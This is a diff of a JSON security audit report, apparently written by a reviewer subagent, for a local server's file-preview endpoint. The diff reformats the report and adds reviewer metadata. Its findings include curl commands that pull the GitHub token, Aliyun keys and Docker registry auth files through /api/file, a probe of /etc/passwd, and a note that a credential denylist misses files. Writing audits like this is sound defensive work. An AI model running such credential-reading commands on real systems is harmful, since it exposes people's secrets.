@@ -1,33 +1,45 @@
 {
-  "verdict": "FAIL",
-  "audited_scopes": [
-    ".dev-team/contract-wave-2026-11-06.md",
-    ".agents/notes/implemented/bug-fix/2026-11-06-out-of-workspace-preview-session-policy.md",
-    "server.mjs",
-    "lib/preview-policy.mjs",
-    "static/index.html"
-  ],
-  "findings": [
-    {
-      "file": "server.mjs",
-      "line": 4356,
-      "rule": "SECURITY",
-      "counterexample_cmd": "S=session-mw47e45cavblex; C=<HOME>/dsh-q20-web; for p in <HOME>/.config/gh/hosts.yml <HOME>/.aliyun/config.json <HOME>/.docker/config.json; do curl -s -o /tmp/o -w \"$p %{http_code} %{size_download}\\n\" --get --data-urlencode \"cwd=$C\" --data-urlencode \"path=$p\" --data-urlencode \"session=$S\" http://127.0.0.1:3090/api/file; done   # 实测 200/242、200/294、200/119：GitHub OAuth token、阿里云 AK、registry auth 字节出网，denylist 仅按名单枚举未覆盖",
-      "severity": "BLOCKING"
-    },
-    {
-      "file": "server.mjs",
-      "line": 6854,
-      "rule": "SECURITY",
-      "counterexample_cmd": "S=session-mw47e45cavblex; for p in /etc/passwd /etc/q20-nope.md; do curl -s -o /dev/null -w \"$p %{http_code}\\n\" --get --data-urlencode 'cwd=/tmp' --data-urlencode \"path=$p\" --data-urlencode \"session=$S\" http://127.0.0.1:3090/api/file; done   # 403 vs 404：未注册 cwd + 合法 sid 时 R-6 早退不生效，存在性 oracle 仍可复现（契约第107行称 404 仅 registered 可达，与实现不符）",
-      "severity": "ADVISORY"
-    },
-    {
-      "file": "tests/acceptance/suite-preview-policy.mjs",
-      "line": 445,
-      "rule": "CORRECTNESS",
-      "counterexample_cmd": "sed -n 439,449p tests/acceptance/suite-preview-policy.mjs; grep -n 'PREVIEW_SENSITIVE_BASENAMES' server.mjs   # A10a 只固化与实现完全同名的 6 个样本，名单外凭据（~/.config/gh/hosts.yml、~/.aliyun/config.json）永不被门禁发现",
-      "severity": "ADVISORY"
-    }
-  ]
+ "verdict": "FAIL",
+ "audited_scopes": [
+  ".dev-team/contract-wave-2026-11-06.md",
+  ".agents/notes/implemented/bug-fix/2026-11-06-out-of-workspace-preview-session-policy.md",
+  "server.mjs",
+  "lib/preview-policy.mjs",
+  "static/index.html"
+ ],
+ "findings": [
+  {
+   "file": "server.mjs",
+   "line": 4356,
+   "rule": "SECURITY",
+   "counterexample_cmd": "S=session-mw47e45cavblex; C=<HOME>/dsh-q20-web; for p in <HOME>/.config/gh/hosts.yml <HOME>/.aliyun/config.json <HOME>/.docker/config.json; do curl -s -o /tmp/o -w \"$p %{http_code} %{size_download}\\n\" --get --data-urlencode \"cwd=$C\" --data-urlencode \"path=$p\" --data-urlencode \"session=$S\" http://127.0.0.1:3090/api/file; done   # 实测 200/242、200/294、200/119：GitHub OAuth token、阿里云 AK、registry auth 字节出网，denylist 仅按名单枚举未覆盖",
+   "severity": "BLOCKING"
+  },
+  {
+   "file": "server.mjs",
+   "line": 6854,
+   "rule": "SECURITY",
+   "counterexample_cmd": "S=session-mw47e45cavblex; for p in /etc/passwd /etc/q20-nope.md; do curl -s -o /dev/null -w \"$p %{http_code}\\n\" --get --data-urlencode 'cwd=/tmp' --data-urlencode \"path=$p\" --data-urlencode \"session=$S\" http://127.0.0.1:3090/api/file; done   # 403 vs 404：未注册 cwd + 合法 sid 时 R-6 早退不生效，存在性 oracle 仍可复现（契约第107行称 404 仅 registered 可达，与实现不符）",
+   "severity": "ADVISORY"
+  },
+  {
+   "file": "tests/acceptance/suite-preview-policy.mjs",
+   "line": 445,
+   "rule": "CORRECTNESS",
+   "counterexample_cmd": "sed -n 439,449p tests/acceptance/suite-preview-policy.mjs; grep -n 'PREVIEW_SENSITIVE_BASENAMES' server.mjs   # A10a 只固化与实现完全同名的 6 个样本，名单外凭据（~/.config/gh/hosts.yml、~/.aliyun/config.json）永不被门禁发现",
+   "severity": "ADVISORY"
+  }
+ ],
+ "schema_version": 2,
+ "reviewer": {
+  "kind": "subagent",
+  "session_id": "7292d902-e4c8-4a4d-8aec-a9435048e0a9",
+  "fresh_context": true
+ },
+ "executed_by": "7292d902-e4c8-4a4d-8aec-a9435048e0a9",
+ "reviewed_commit": "2491389",
+ "attestation": {
+  "self_signed": false,
+  "note": "independent subagent, fresh context; reviewed working-tree diff at the recorded base commit"
+ }
 }
